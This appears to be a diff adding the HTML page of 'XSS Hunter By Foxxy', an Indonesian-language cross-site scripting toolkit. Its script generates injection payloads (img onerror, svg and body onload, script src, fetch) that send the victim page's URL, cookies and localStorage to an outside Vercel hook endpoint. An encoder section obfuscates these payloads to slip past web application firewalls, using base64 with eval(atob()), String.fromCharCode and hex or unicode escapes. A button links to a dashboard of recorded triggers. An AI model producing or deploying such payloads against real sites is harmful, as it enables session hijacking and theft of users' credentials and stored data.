@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Hunter By Foxxy | Payload Generator + WAF Bypass</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: #e0e0e0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #00ff00, #00ccff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .sub {
+            text-align: center;
+            color: #888;
+            margin-bottom: 30px;
+        }
+        .card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .card h2 {
+            margin-bottom: 15px;
+            color: #00ff00;
+            font-size: 1.4rem;
+        }
+        label {
+            display: block;
+            margin-top: 12px;
+            margin-bottom: 6px;
+            font-weight: bold;
+        }
+        input, textarea, select {
+            width: 100%;
+            padding: 10px;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            color: #00ff00;
+            font-family: monospace;
+        }
+        button {
+            margin-top: 15px;
+            padding: 10px 20px;
+            background: linear-gradient(135deg, #00ff00, #00ccff);
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .output {
+            background: #0a0a0a;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-family: monospace;
+            word-break: break-all;
+            border-left: 3px solid #00ff00;
+        }
+        .copy-btn {
+            background: #333;
+            color: #00ff00;
+            margin-top: 8px;
+            padding: 5px 10px;
+            font-size: 12px;
+        }
+        .flex-row {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        .flex-col {
+            flex: 1;
+            min-width: 250px;
+        }
+        hr {
+            border-color: #333;
+            margin: 15px 0;
+        }
+        @media (max-width: 700px) {
+            .flex-row { flex-direction: column; }
+        }
+        .badge {
+            display: inline-block;
+            background: #00ff0022;
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-left: 8px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🕵️ XSS Hunter Toolkit</h1>
+    <div class="sub">Payload Generator + WAF Bypass + Real-time Dashboard</div>
+
+    <!-- Bagian 1: Konfigurasi Endpoint -->
+    <div class="card">
+        <h2>⚙️ Konfigurasi Hunter</h2>
+        <label>Endpoint Vercel (API Hook)</label>
+        <input type="text" id="endpoint" placeholder="https://xss-hunter-by-foxxy.vercel.app/api/hook" value="https://xss-hunter-by-foxxy.vercel.app/api/hook">
+        <label>Marker (identifikasi lokasi injeksi)</label>
+        <input type="text" id="marker" placeholder="misal: contact-form, header, level1" value="test">
+    </div>
+
+    <!-- Bagian 2: Generator Payload (Opsi 1) -->
+    <div class="card">
+        <h2>📦 Generator Payload Hunter <span class="badge">Opsi 1</span></h2>
+        <div class="flex-row">
+            <div class="flex-col">
+                <label>Tipe Payload</label>
+                <select id="payloadType">
+                    <option value="img">🖼️ Image onerror (classic)</option>
+                    <option value="script_src">📜 Script External (src)</option>
+                    <option value="fetch">🌐 Fetch POST (advanced)</option>
+                    <option value="body">🧬 Body onload</option>
+                    <option value="svg">🎨 SVG onload</option>
+                </select>
+                <label>Data tambahan (cookies, localStorage, URL)</label>
+                <select id="dataOption">
+                    <option value="basic">Hanya marker & URL</option>
+                    <option value="cookies">+ Cookies</option>
+                    <option value="all">+ Cookies + localStorage</option>
+                </select>
+            </div>
+            <div class="flex-col">
+                <label>Hasil Payload (copy & inject)</label>
+                <div id="generatedPayload" class="output">Pilih tipe payload...</div>
+                <button id="copyPayloadBtn" class="copy-btn">📋 Copy Payload</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bagian 3: WAF Bypass Encoder (Opsi 2) -->
+    <div class="card">
+        <h2>🔐 WAF Bypass Encoder <span class="badge">Opsi 2</span></h2>
+        <div class="flex-row">
+            <div class="flex-col">
+                <label>Payload mentah (dari generator atau custom)</label>
+                <textarea id="rawPayload" rows="3" placeholder="Tempel payload di sini..."></textarea>
+                <label>Metode Encoding</label>
+                <select id="encodeMethod">
+                    <option value="none">Tanpa encoding</option>
+                    <option value="html">HTML Entity (&#x3C;script>)</option>
+                    <option value="url">URL Encode</option>
+                    <option value="unicode">Unicode Escape (\\u003c)</option>
+                    <option value="hex">Hex String</option>
+                    <option value="b64">Base64 + eval(atob())</option>
+                    <option value="charCode">String.fromCharCode</option>
+                </select>
+                <button id="encodeBtn">🔧 Encode</button>
+            </div>
+            <div class="flex-col">
+                <label>Hasil Encoded</label>
+                <div id="encodedOutput" class="output">-</div>
+                <button id="copyEncodedBtn" class="copy-btn">📋 Copy Encoded</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Informasi Dashboard -->
+    <div class="card">
+        <h2>📊 Dashboard Trigger <span class="badge">Opsi 4</span></h2>
+        <p>Lihat semua XSS trigger yang tercatat di database.</p>
+        <button id="goDashboardBtn">🚀 Buka Dashboard</button>
+        <p style="font-size: 12px; margin-top: 10px; color: #888;">Pastikan Redis database sudah di-set di Vercel (Upstash).</p>
+    </div>
+</div>
+
+<script>
+    // Elemen
+    const endpointInput = document.getElementById('endpoint');
+    const markerInput = document.getElementById('marker');
+    const payloadType = document.getElementById('payloadType');
+    const dataOption = document.getElementById('dataOption');
+    const generatedPayloadDiv = document.getElementById('generatedPayload');
+    const rawPayloadText = document.getElementById('rawPayload');
+    const encodeMethod = document.getElementById('encodeMethod');
+    const encodedOutputDiv = document.getElementById('encodedOutput');
+
+    // Helper: build URL endpoint dengan marker dan data
+    function buildEndpointUrl(extraData = '') {
+        let base = endpointInput.value.trim();
+        if (!base) return '';
+        let marker = markerInput.value.trim();
+        let urlParam = `marker=${encodeURIComponent(marker)}&url=${encodeURIComponent(window.location.href)}`;
+        if (extraData) urlParam += '&' + extraData;
+        return `${base}?${urlParam}`;
+    }
+
+    // Generate payload berdasarkan tipe
+    function generatePayload() {
+        const type = payloadType.value;
+        const data = dataOption.value;
+        let hookUrl = endpointInput.value.trim();
+        let marker = markerInput.value.trim();
+        if (!hookUrl) {
+            generatedPayloadDiv.innerText = '❌ Isi endpoint dulu!';
+            return;
+        }
+        // buat base url dengan marker dan url dinamis (window.location.href akan di-encode di payload)
+        let baseWithMarker = `${hookUrl}?marker=${marker}&url=` + (data !== 'basic' ? "'+encodeURIComponent(window.location.href)+'" : 'window.location.href');
+        if (data === 'cookies') baseWithMarker += `&cookies='+encodeURIComponent(document.cookie)+'`;
+        if (data === 'all') baseWithMarker += `&cookies='+encodeURIComponent(document.cookie)+'&localStorage='+encodeURIComponent(JSON.stringify(localStorage))+'`;
+
+        let payload = '';
+        switch(type) {
+            case 'img':
+                payload = `<img src=x onerror="fetch('${baseWithMarker}')">`;
+                break;
+            case 'script_src':
+                payload = `<script src="${hookUrl}?marker=${marker}&url=${window.location.href}"></script>`;
+                break;
+            case 'fetch':
+                payload = `<script>fetch('${hookUrl}?marker=${marker}&url='+encodeURIComponent(window.location.href)${data !== 'basic' ? `+'&cookies='+encodeURIComponent(document.cookie)` : ''})</script>`;
+                break;
+            case 'body':
+                payload = `<body onload="fetch('${baseWithMarker}')">`;
+                break;
+            case 'svg':
+                payload = `<svg/onload="fetch('${baseWithMarker}')">`;
+                break;
+            default: payload = '';
+        }
+        generatedPayloadDiv.innerText = payload;
+        // juga set ke rawPayload untuk encoder
+        rawPayloadText.value = payload;
+    }
+
+    // Encode payload
+    function encodePayload() {
+        let raw = rawPayloadText.value;
+        if (!raw) {
+            encodedOutputDiv.innerText = '❌ Tidak ada payload untuk di-encode';
+            return;
+        }
+        const method = encodeMethod.value;
+        let encoded = raw;
+        switch(method) {
+            case 'html':
+                encoded = raw.replace(/[&<>]/g, function(m) {
+                    if (m === '&') return '&amp;';
+                    if (m === '<') return '&lt;';
+                    if (m === '>') return '&gt;';
+                    return m;
+                });
+                break;
+            case 'url':
+                encoded = encodeURIComponent(raw);
+                break;
+            case 'unicode':
+                encoded = raw.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
+                break;
+            case 'hex':
+                encoded = raw.split('').map(c => '\\x' + c.charCodeAt(0).toString(16)).join('');
+                break;
+            case 'b64':
+                let b64 = btoa(unescape(encodeURIComponent(raw)));
+                encoded = `<script>eval(atob('${b64}'))</script>`;
+                break;
+            case 'charCode':
+                let charCodes = raw.split('').map(c => c.charCodeAt(0)).join(',');
+                encoded = `<script>eval(String.fromCharCode(${charCodes}))</script>`;
+                break;
+            default: encoded = raw;
+        }
+        encodedOutputDiv.innerText = encoded;
+    }
+
+    // Event listeners
+    payloadType.addEventListener('change', generatePayload);
+    dataOption.addEventListener('change', generatePayload);
+    markerInput.addEventListener('input', generatePayload);
+    endpointInput.addEventListener('input', generatePayload);
+    document.getElementById('copyPayloadBtn').addEventListener('click', () => {
+        const text = generatedPayloadDiv.innerText;
+        if (text && text !== 'Pilih tipe payload...') {
+            navigator.clipboard.writeText(text);
+            alert('Payload disalin!');
+        }
+    });
+    document.getElementById('encodeBtn').addEventListener('click', encodePayload);
+    document.getElementById('copyEncodedBtn').addEventListener('click', () => {
+        const text = encodedOutputDiv.innerText;
+        if (text && text !== '-') {
+            navigator.clipboard.writeText(text);
+            alert('Encoded payload disalin!');
+        }
+    });
+    document.getElementById('goDashboardBtn').addEventListener('click', () => {
+        window.location.href = '/dashboard.html';
+    });
+
+    generatePayload();
+</script>
+</body>
+                  </html>
